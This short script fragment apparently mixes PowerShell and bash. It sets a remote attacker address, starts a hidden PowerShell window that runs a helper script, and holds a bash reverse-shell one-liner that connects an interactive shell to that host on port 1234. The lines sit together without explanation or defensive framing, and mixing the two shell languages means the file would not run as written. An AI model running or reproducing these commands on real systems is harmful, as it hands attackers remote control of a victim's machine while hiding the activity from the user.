$RHOST = '172.18.141.67'

Start-Process -WindowStyle hidden -FilePath powershell.exe -ArgumentList "-NoExit -Command $PSScriptRoot\helper.ps1"

bash -c 'exec bash -i &>/dev/tcp/$RHOST/1234 <&1'
